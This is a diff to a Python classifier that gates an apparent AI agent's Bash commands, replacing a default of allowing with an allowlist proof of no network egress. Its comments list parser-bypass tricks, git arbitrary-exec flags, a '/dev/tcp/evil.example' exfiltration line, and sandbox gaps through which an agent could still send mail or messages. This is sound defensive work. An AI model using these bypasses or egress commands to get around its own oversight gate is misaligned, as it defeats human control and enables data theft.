@@ -18,7 +18,13 @@ Discipline (docs/authority-matrix-design-2026-06-19.md §2, FIX-1/FIX-7):
     `tool_input`. (Lane resolution lives in `lane.py`, the only env reader.)
   * **Fail-safe.** Ambiguous / unknown actions resolve to `AMBIGUOUS` — a
     distinct, visible, propose-defaulting value — NOT silently to `local_edit`.
-    Only a positively-local / no-egress signal yields `local_edit`.
+    Only a positively-local / no-egress signal yields `local_edit`. For a Bash
+    command that proof is `_is_provably_local` (below); before 2026-07-27 the
+    Bash arm ENDED in a bare `return "local_edit"`, so this bullet was a
+    docstring the code contradicted — `sendmail`, `mail`, `nc`, `ssh`, a
+    python `smtplib` one-liner, an `osascript` Messages send and a GET webhook
+    all classified reversible and ALLOWED in guardian and sovereign, walking
+    the whole always-gated comms ceiling by shelling out.
   * **Positive ceiling classification.** The always-gated execution-surface
     classes — secrets (.env / secret-store access), network_write (live
     mutating MCP/HTTP POST/PUT/DELETE), credentials_grant (oauth / token
@@ -26,9 +32,14 @@ Discipline (docs/authority-matrix-design-2026-06-19.md §2, FIX-1/FIX-7):
     the `AMBIGUOUS` backstop. This is the fail-closed spine: the gate must see
     these as their ceiling class regardless of anything else.
 
-System Python is 3.9.6; stdlib + one framework leaf template constant
-(framework.frontdoor.calendar_template.CALENDAR_EVENT_SCRIPT, imported call-time
-inside _classify_bash so module load stays cycle-free) [GERM-2].
+System Python is 3.9.6; stdlib + TWO call-time framework imports, both inside
+_classify_bash so module load stays cycle-free [GERM-2]: the leaf template
+constant framework.frontdoor.calendar_template.CALENDAR_EVENT_SCRIPT, and
+framework.authority.policy_engine.extract_invoked_binaries (the shell parser
+`_is_provably_local` asks its capability question of — imported call-time
+because policy_engine imports THIS module at load, and re-implementing a
+second shell parser here is the duplicate-source failure this program keeps
+deleting).
 """
 from __future__ import annotations
 
@@ -372,8 +383,223 @@ def _classify_bash(command: str) -> str:
             return "calendar_event_create"
         return AMBIGUOUS
 
-    # --- everything else local / reversible / no-egress -------------------
-    return "local_edit"
+    # --- positively local, or nothing ------------------------------------
+    # THE DEFAULT IS NOT local_edit. A command earns `local_edit` only by
+    # PROVING it cannot reach the network or another process; everything else
+    # is the visible propose-defaulting backstop. See _is_provably_local.
+    return "local_edit" if _is_provably_local(cmd) else AMBIGUOUS
+
+
+# ---------------------------------------------------------------------------
+# Positive locality — the no-egress proof a Bash command must pass [BASH-REACH]
+# ---------------------------------------------------------------------------
+#
+# WHY THIS IS AN ALLOWLIST AND NOT A LIST OF SENDERS. The obvious fix — deny
+# `sendmail`, `mail`, `nc`, `curl`, `osascript`, `ssh` … — is a hand-maintained
+# blocklist, the shape this program keeps deleting, and it loses to the first
+# name nobody wrote down: a wrapper script, a rename, an unknown binary. It
+# also loses to the shell PARSER's own documented gaps, and that is the
+# decisive argument, because those gaps are MEASURED, not hypothetical.
+# `extract_invoked_binaries` (policy_engine.py:627) states them, and each one
+# resolves the command word to something that is not the real binary:
+#
+#     2>/dev/null curl https://x   -> ['null']      (leading-redirect prefix)
+#     sudo curl https://x          -> ['sudo']      (sudo is not a wrapper)
+#     echo x | xargs curl          -> ['xargs']     (dataflow-decoupled)
+#     A=curl; $A https://x         -> ['$A']        (variable indirection)
+#     $'curl' https://x            -> ['$curl']     (ANSI-C quoting)
+#     perl -e 'system("curl x")'   -> ['perl']      (interpreter shell-out)
+#     . /tmp/push.sh               -> ['.']         (dot-source)
+#
+# Against a BLOCKLIST every one of those is a bypass: the extracted name is not
+# on the list, so the command is allowed. Against THIS allowlist every one of
+# them is caught, without naming a single sender: `null`, `sudo`, `xargs`,
+# `$A`, `$curl`, `perl` and `.` are all simply not provably-local binaries, so
+# the command fails the proof and proposes. The parser's weakness stops being
+# a hole and becomes a conservative answer — which is the whole point of
+# inverting the default, and is why the fix is one flipped default rather than
+# a detector bolted alongside.
+#
+# MEMBERSHIP RULE, applied to every entry: a binary belongs here only if IT
+# ITSELF can neither open a socket NOR execute another program, in ANY
+# invocation. Exec capability disqualifies just as hard as network capability,
+# because it is one hop from it. That rule is what excludes tools whose absence
+# surprises people: `find` (-exec), `xargs`, `awk` (system()), `sed` (GNU
+# s///e), `sort` (--compress-program), `tar` (-I/--use-compress-program),
+# `make`, `npm`, and every interpreter (python/node/perl/ruby/osascript). A
+# missing entry costs a propose — a wrong entry costs the ceiling, so the list
+# stays small and the doubt resolves by leaving a name OUT.
+#
+# WHERE THE RULE STOPS, stated because a reviewer rightly pushed on it: it is
+# about the binary's own capability IN THIS INVOCATION, not about what some
+# LATER process might do with a file it wrote. `cp`, `mv`, `tee`, `ln` and
+# `chmod` can plant a launch agent, a git hook or a shell rc that executes
+# later, and they are still members — because arbitrary local file writing is
+# not this predicate's job. It is governed by the path_block/germline policies
+# and by the sandbox's file-write denies, and treating it as egress here would
+# be incoherent with `Edit`/`Write`, which classify `local_edit` for exactly
+# the same write. The line this set draws is "no reach from THIS command".
+_LOCAL_ONLY_BINARIES = frozenset({
+    # read / inspect. `rg` is ABSENT on purpose (--pre runs a preprocessor
+    # program), as is `yq` (its expression language is not audited here).
+    "ls", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep",
+    "diff", "cmp", "file", "stat", "du", "tree", "nl",
+    "basename", "dirname", "realpath", "readlink", "pwd",
+    # text transform (no exec escape)
+    "cut", "tr", "uniq", "comm", "join", "paste", "rev", "fold", "expand",
+    "unexpand", "column", "fmt", "jq", "xxd", "od", "base64", "base32",
+    "strings", "tac",
+    # write / move within the filesystem. `install` is ABSENT on purpose
+    # (--strip-program runs a program).
+    "mkdir", "rmdir", "touch", "cp", "mv", "rm", "ln", "chmod", "truncate",
+    "mktemp", "tee", "sync",
+    # shell-inert scalars + navigation builtins (no exec, no reach)
+    "echo", "printf", "true", "false", "yes", "seq", "sleep", "date",
+    "expr", "test", "[", "[[", "wait", "type", "which", "hash",
+    "cd", "pushd", "popd", "umask", "shift", ":",
+    # identity / host facts. NOT claimed to be resolver-free: `id`/`groups` can
+    # query a directory on a domain-bound host. They carry NO attacker-chosen
+    # destination, which is the property that matters. `hostname` (‑f does a
+    # gethostbyname) and `df` (stats network mounts) are ABSENT rather than
+    # explained away.
+    "whoami", "id", "uname", "groups", "tty", "logname",
+    # digests
+    "md5", "md5sum", "shasum", "sha1sum", "sha256sum", "sha512sum", "cksum",
+    # single-purpose (de)compressors — no program-spawning flag
+    "gzip", "gunzip", "zcat", "bzip2", "bunzip2", "xz", "unxz", "zstd",
+})
+
+# `git` is the one binary worth resolving per-SUBCOMMAND rather than excluding
+# outright: it is both the most-run command in this repo and a network client,
+# and `git status` classifying propose-only would be friction with no security
+# return. The verbs below are read-only by construction. DEFAULT IS NOT LOCAL —
+# an unlisted or absent verb (push, fetch, pull, clone, remote, submodule,
+# send-email, ls-remote, daemon, credential, svn, p4, imap-send, http-*, and
+# anything git grows next) fails the proof.
+#
+# The membership rule is the same one the binary set uses — no arbitrary
+# program may run — and it removed nine verbs a first pass had wrongly kept
+# (found by an adversarial review, 2026-07-27, and each one verified):
+#   * `checkout`, `switch`, `restore`, `worktree`, `stash` run the
+#     `post-checkout` hook and `.gitattributes` smudge/clean FILTER programs;
+#   * `add` runs the clean filter;
+#   * `grep` takes `-O/--open-files-in-pager=PROG`, which runs PROG;
+#   * `config` takes `--edit`, which launches $EDITOR;
+#   * `help` takes `-w`, which launches a browser;
+#   * `tag -s` / `verify-commit` / `verify-tag` shell out to gpg.
+# `commit`, `merge`, `rebase`, `am` and `cherry-pick` never appeared, for the
+# same hook reason.
+_GIT_LOCAL_SUBCOMMANDS = frozenset({
+    "status", "log", "diff", "show", "branch", "reset", "rev-parse",
+    "rev-list", "ls-files", "ls-tree", "cat-file", "blame", "shortlog",
+    "describe", "merge-base", "symbolic-ref", "for-each-ref", "name-rev",
+    "check-ignore", "hash-object", "count-objects", "diff-tree", "diff-index",
+    "whatchanged", "range-diff", "var", "version", "reflog", "check-attr",
+})
+
+# git's own value-taking flags — the token AFTER these is a value, never the
+# subcommand (`git -C /path status` must resolve to `status`, not `/path`).
+# These name a DIRECTORY or a namespace and cannot introduce a program.
+_GIT_VALUE_FLAGS = frozenset({
+    "-C", "--git-dir", "--work-tree", "--namespace", "--super-prefix",
+})
+
+# git flags that DISQUALIFY the whole invocation however local the verb looks.
+# `-c` was in the value-flag set above and therefore silently SKIPPED — git's
+# single most direct arbitrary-exec vector: `git -c core.fsmonitor=/tmp/x
+# status` and `git -c diff.external=/tmp/x diff` both run /tmp/x while reading
+# as a plain status/diff. `--exec-path` relocates the helper binaries git
+# itself execs.
+_GIT_DISQUALIFYING_FLAGS = ("-c", "--config-env", "--exec-path")
+
+# The shell's OWN network primitive, which invokes no binary at all:
+# `echo leak > /dev/tcp/evil.example/25` extracts to ['echo'] — a
+# provably-local binary — and would otherwise pass the proof. Bash opens the
+# socket itself, so this is checked on the raw text, where it is a shell
+# feature rather than a program name.
+_DEV_SOCKET_RE = re.compile(r"/dev/(?:tcp|udp)/")
+
+
+def _git_subcommands(tokens: "list[str]") -> "list[str]":
+    """Every verb reached through a `git` token, in order.
+
+    Returns "" for a `git` with no verb (bare `git`, or only flags), which is
+    not in the local set and therefore fails the proof — absent is never
+    treated as benign.
+    """
+    subs: list[str] = []
+    i = 0
+    while i < len(tokens):
+        if _bare_name(tokens[i]) != "git":
+            i += 1
+            continue
+        verb = ""                      # absent verb -> in no local set
+        j = i + 1
+        while j < len(tokens):
+            t = tokens[j]
+            if t in _GIT_DISQUALIFYING_FLAGS or any(
+                    t.startswith(f + "=") for f in _GIT_DISQUALIFYING_FLAGS):
+                verb = "__git_disqualified__"
+                break
+            if t in _GIT_VALUE_FLAGS:
+                j += 2
+                continue
+            if t.startswith("-"):
+                j += 1
+                continue
+            verb = t
+            break
+        subs.append(verb)
+        i = j + 1
+    return subs
+
+
+def _bare_name(token: str) -> str:
+    """`/usr/bin/git` / `"git"` -> `git`. Mirrors the parser's own stripping."""
+    return token.strip("'\"\\").rsplit("/", 1)[-1]
+
+
+def _is_provably_local(command: str) -> bool:
+    """True IFF every program this command invokes is provably unable to reach
+    the network or another process — the ONLY signal that yields `local_edit`.
+
+    Fail-closed in every direction: an unparseable command, an unavailable
+    parser, an empty extraction, one unrecognized binary, one non-local git
+    verb, or a `/dev/tcp` socket all return False (-> AMBIGUOUS -> propose).
+
+    RESIDUAL — what this does NOT do, stated so it is not mistaken for
+    containment: it decides a CLASSIFICATION, not an execution. It cannot stop
+    a socket from opening; only the egress jail and the Seatbelt profile
+    (cabinet/scripts/egress-guard.sh, cabinet/scripts/lib/officer-sandbox.sh)
+    do that, and the sandbox is `(allow default)` with no appleevent-send or
+    mach-lookup deny, so an osascript Mail/Messages send remains executable at
+    full egress enforcement. It also sees only what reaches THIS gate: a
+    subprocess spawned by an already-allowed command, a launchd service, and
+    every non-Bash path are outside it. Registered in
+    docs/plans/declared-residuals-register.md.
+    """
+    if _DEV_SOCKET_RE.search(command):
+        return False
+    try:
+        from framework.authority.policy_engine import extract_invoked_binaries
+        binaries = extract_invoked_binaries(command)
+    except Exception:
+        return False                     # no parser -> nothing is proven
+    if not binaries:
+        return False                     # proved nothing -> not local
+    names = [_bare_name(b) for b in binaries]
+    if any(n not in _LOCAL_ONLY_BINARIES and n != "git" for n in names):
+        return False
+    if "git" in names:
+        try:
+            import shlex
+            tokens = shlex.split(command, posix=True)
+        except Exception:
+            return False                 # unparseable -> unproven
+        subs = _git_subcommands(tokens)
+        if not subs or any(s not in _GIT_LOCAL_SUBCOMMANDS for s in subs):
+            return False
+    return True
 
 
 _BRANCH_REFSPEC_RE = re.compile(r"(?:HEAD:)?(?:refs/heads/)?(\S+)$")
